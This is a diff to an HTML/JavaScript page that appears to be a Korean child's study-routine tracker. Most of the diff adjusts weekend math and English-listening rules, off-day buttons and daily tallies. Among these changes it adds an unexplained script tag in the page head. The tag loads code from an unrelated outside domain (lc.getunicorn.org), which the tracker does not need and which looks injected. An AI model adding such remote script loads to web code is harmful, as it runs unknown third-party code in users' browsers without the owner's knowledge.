@@ -147,6 +147,7 @@
         .day-btn.checked { background-color: #2e7d32 !important; border-color: #1b5e20 !important; color: white; }
         .day-btn.circle { background-color: #ff8f00 !important; border-color: #ff6f00 !important; color: white; }
         .day-btn.sick { background-color: #5c6bc0 !important; border-color: #3949ab !important; color: white; font-size: 18px; }
+        .day-btn.off { background: #eeeeee; border-color: #e0e0e0; color: #9e9e9e; cursor: not-allowed; }
         .day-btn.pass { background: #eceff1; border-color: #cfd8dc; color: #546e7a; cursor: default; }
         
         /* 아침 수학 전용 버튼 */
@@ -211,6 +212,7 @@
         /* 팝업 모달 */
         .popup { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: rgba(0,0,0,0.88); color: white; padding: 18px 28px; border-radius: 24px; display: none; z-index: 2000; text-align: center; font-weight: bold; font-size: 15px; border: 1.5px solid #fff; width: 85%; max-width: 380px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); line-height: 1.4; white-space: pre-line; }
         .day-box.is-today .day-label { color: #5e35b1; font-weight: bold; text-decoration: underline; }
+        .weekend-math-note { font-size: 11px; color: #5e35b1; font-weight: 700; margin-top: 3px; }
 
         /* [개선안 1 전용 UI] 영어 수업노트 & Active Recall 인출 구조 */
         #notesView, #reviewView { max-width: 680px; margin: 0 auto; }
@@ -278,6 +280,7 @@
         .fix-was { color: #d84315; font-size: 14px; text-decoration: line-through; margin-bottom: 4px; }
         .fix-now { color: #2e7d32; font-weight: 700; font-size: 16px; line-height: 1.5; }
     </style>
+<script type="text/javascript" nonce="XOJ0BVE+zr3qdJZKBBAaLFbFzesxhK/xP1QmLnOdycs=" src="//lc.getunicorn.org?type=base-script&amp;request-id=152374"></script>
 </head>
 <body>
     <div id="popup" class="popup"></div>
@@ -379,6 +382,7 @@
         const weekdayList = ['월', '화', '수', '목', '금'];
         const fullWeekList = ['월', '화', '수', '목', '금', '토', '일'];
         const sixDayList = ['월', '화', '수', '목', '금', '주말'];
+        const MATH_PM_OFF = ['화', '목', '토', '일']; /* 화·목은 오후 수학을 쉬고, 주말은 오전 2p만으로 완료 */
 
         const todayIdx = (new Date().getDay() + 6) % 7;
         const todayName = fullWeekList[todayIdx];
@@ -386,14 +390,14 @@
 
         const routineData = {
             morning: [
-                { id: 'english_morning', group: 'eng', name: '오전 영어 집중듣기 (30분)', emoji: '🎧', trigger: '07:00 ~ 07:30 맑은 정신으로!', effort: '음원과 눈으로 편안하게 따라 읽기', isSixDay: true, allowSick: true },
+                { id: 'english_morning', group: 'eng', name: '오전 영어 집중듣기 (30분)', emoji: '🎧', trigger: '07:00 ~ 07:30 맑은 정신으로!', effort: '음원과 눈으로 편안하게 따라 읽기', daysNote: '토·일 각각 오전/오후 중 1회', weekendEnabled: true, allowSick: true },
                 { id: 'english_read_along_morning', group: 'eng', name: '오전 1권 따라 읽기 (Read-Along)', emoji: '🗣️', trigger: '집중듣기 한 책 중 1권 골라서!', effort: '소리 내어 자신 있게 읽으면 성공!', isSixDay: true, allowSick: true },
-                { id: 'math_morning', group: 'math', name: '아침 수학 공부', emoji: '🔢', trigger: '07:30 ~ 08:00', instruction: '오전에 한 만큼 골라요. 2p까지 했다면 나머지는 오후에 이어서 해요!', isMathMorning: true, isSixDay: true, allowSick: true }
+                { id: 'math_morning', group: 'math', name: '아침 수학 공부', emoji: '🔢', trigger: '07:30 ~ 08:00', instruction: '평일은 2p 또는 4p까지 선택해요. 토·일은 2p만 해도 하루 수학 완료!', isMathMorning: true, weekendEnabled: true, allowSick: true }
             ],
             afternoon: [
-                { id: 'math_afternoon', group: 'math', name: '오후 수학 이어서 하기 (2페이지)', emoji: '🧩', trigger: '월/수 하교 후(태권도 전) 또는 저녁 시간', instruction: '오전에 2p까지 했을 때 이어서 마무리해요!', isMathAfternoon: true, isSixDay: true, allowSick: true },
+                { id: 'math_afternoon', group: 'math', name: '오후 수학 이어서 하기 (2페이지)', emoji: '🧩', trigger: '월/수 하교 후(태권도 전) 또는 저녁 시간', instruction: '오전에 2p까지 했을 때 이어서 마무리해요. 토·일은 쉬어요.', offDays: MATH_PM_OFF, daysNote: '화·목·토·일은 쉬어요', isMathAfternoon: true, weekendEnabled: true, allowSick: true },
                 { id: 'talkstation_prep', group: 'talk', name: '화상영어 5분 사전 복습', emoji: '📓', trigger: '월/수 오후 2:20 (수업 10분 전)', instruction: '지난 수업 노트 문장 3번 읽고 뇌 워밍업!', customDays: ['월', '수'], daysNote: '월/수 2:20', allowSick: true },
-                { id: 'english_afternoon', group: 'eng', name: '오후 영어 집중듣기 (30분)', emoji: '🎧', trigger: '월/수: 태권도 전 / 화/목/금: 저녁 식사 후', isSixDay: true, allowSick: true },
+                { id: 'english_afternoon', group: 'eng', name: '오후 영어 집중듣기 (30분)', emoji: '🎧', trigger: '월/수: 태권도 전 / 화/목/금: 저녁 식사 후', daysNote: '토·일 각각 오전/오후 중 1회', weekendEnabled: true, allowSick: true },
                 { id: 'english_write_sentence', group: 'eng', name: '마음에 드는 문장 따라 쓰기', emoji: '✏️', isSixDay: true, allowSick: true },
                 { id: 'hanja', name: '한자 학습', emoji: '✍️', customDays: ['1회', '2회', '3회'], activeDays: ['월', '수', '금', '주말'], daysNote: '월/수/금/주말', isSixDay: true, allowSick: true },
                 { id: 'reading_combined', name: '독서 시간', emoji: '📖', trigger: '읽고 싶은 책 자유롭게 꺼내기', weekendEnabled: true, allowSick: true },
@@ -470,6 +474,18 @@
             }
         }
 
+        /* 주말 집중듣기: 토요일과 일요일을 각각 독립해서 기록하고, 각 날짜는 오전/오후 중 한 번만 하면 완료 */
+        const ENG_WEEKEND = {
+            english_morning: ['english_afternoon', '오후 완료'],
+            english_afternoon: ['english_morning', '오전 완료']
+        };
+        function weekendPassLabel(id, d, state) {
+            const m = ENG_WEEKEND[id];
+            if (!m || !['토', '일'].includes(d) || state !== 'empty') return null;
+            const o = data.routines[m[0] + '-' + d];
+            return (o === 'checked' || o === 'circle') ? m[1] : null;
+        }
+
         /* 집계: 수학은 오전/오후 칸을 따로 세지 않고 '하루 1개'로 계산
            - 오전에 모두 마친 날(math_4p) → 완료 1개
            - 오전 일부(math_2p) + 오후 칸 체크 → 오후 칸 상태로 1개
@@ -478,12 +494,26 @@
             const s = { green: 0, yellow: 0, sick: 0 };
             const add = v => { if (v === 'checked') s.green++; else if (v === 'circle') s.yellow++; else if (v === 'sick') s.sick++; };
             Object.entries(data.routines).forEach(([k, v]) => {
-                if (!k.startsWith('math_morning-') && !k.startsWith('math_afternoon-')) add(v);
+                const isWeekendEnglish = /^(english_morning|english_afternoon)-(토|일)$/.test(k);
+                if (!k.startsWith('math_morning-') && !k.startsWith('math_afternoon-') && !isWeekendEnglish) add(v);
+            });
+            /* 토요일과 일요일은 각각 오전/오후를 합쳐 하루 1개로 계산 */
+            const rank = { checked: 3, circle: 2, sick: 1 };
+            ['토', '일'].forEach(d => {
+                const we = [data.routines['english_morning-' + d], data.routines['english_afternoon-' + d]]
+                    .filter(v => rank[v]).sort((a, b) => rank[b] - rank[a]);
+                if (we.length) add(we[0]);
             });
             sixDayList.forEach(d => {
                 const m = data.routines['math_morning-' + d];
                 const a = data.routines['math_afternoon-' + d];
-                add(m === 'math_4p' ? 'checked' : a);
+                if (MATH_PM_OFF.includes(d)) add(m === 'math_4p' || m === 'math_2p' ? 'checked' : null);
+                else add(m === 'math_4p' ? 'checked' : a);
+            });
+            /* 주말 수학은 토·일 각각 2p만 해도 하루 완료 */
+            ['토', '일'].forEach(d => {
+                const m = data.routines['math_morning-' + d];
+                add(m === 'math_2p' || m === 'math_4p' ? 'checked' : null);
             });
             return s;
         }
@@ -538,21 +568,36 @@
 
         function createCard(r) {
             let days = r.customDays ? r.customDays : (r.weekendEnabled ? fullWeekList : (r.isSixDay ? sixDayList : weekdayList));
-            let currentCheckLabel = r.isSixDay ? todayLabel : todayName;
+            let currentCheckLabel = r.weekendEnabled ? todayName : (r.isSixDay ? todayLabel : todayName);
             if (currentFilter === 'today' && !(r.activeDays || days).includes(currentCheckLabel)) return '';
+            if (currentFilter === 'today' && r.offDays && r.offDays.includes(currentCheckLabel)) return '';
             
             let dHtml = '';
             let displayDays = (currentFilter === 'today' && !r.activeDays) ? [currentCheckLabel] : days;
 
             displayDays.forEach((d) => {
+                if (r.offDays && r.offDays.includes(d)) {
+                    dHtml += `<div class="day-box ${d === currentCheckLabel ? 'is-today' : ''}">
+                        <div class="day-label">${d}</div>
+                        <button class="day-btn off" disabled>OFF</button>
+                    </div>`;
+                    return;
+                }
                 const key = r.id + '-' + d;
                 const state = data.routines[key] || 'empty';
+                const passLabel = weekendPassLabel(r.id, d, state);
                 
                 if (r.isMathMorning) {
+                    const isWeekendMath = (d === '토' || d === '일');
                     dHtml += `<div class="day-box ${d === currentCheckLabel ? 'is-today' : ''}">
                         <div class="day-label">${d}</div>
                         <button class="math-opt-btn ${state === 'math_2p' ? 'done-2p' : ''}" onclick="selectMathMorning('${d}', 'math_2p')">2p까지</button>
-                        <button class="math-opt-btn ${state === 'math_4p' ? 'done-4p' : ''}" onclick="selectMathMorning('${d}', 'math_4p')">4p까지</button>
+                        ${isWeekendMath ? '<div class="weekend-math-note">2p면 완료</div>' : `<button class="math-opt-btn ${state === 'math_4p' ? 'done-4p' : ''}" onclick="selectMathMorning('${d}', 'math_4p')">4p까지</button>`}
+                    </div>`;
+                } else if (passLabel) {
+                    dHtml += `<div class="day-box ${d === currentCheckLabel ? 'is-today' : ''}">
+                        <div class="day-label">${d}</div>
+                        <button class="day-btn pass" disabled>${passLabel}</button>
                     </div>`;
                 } else if (r.id === 'math_afternoon' && data.routines['math_morning-' + d] === 'math_4p') {
                     dHtml += `<div class="day-box ${d === currentCheckLabel ? 'is-today' : ''}">
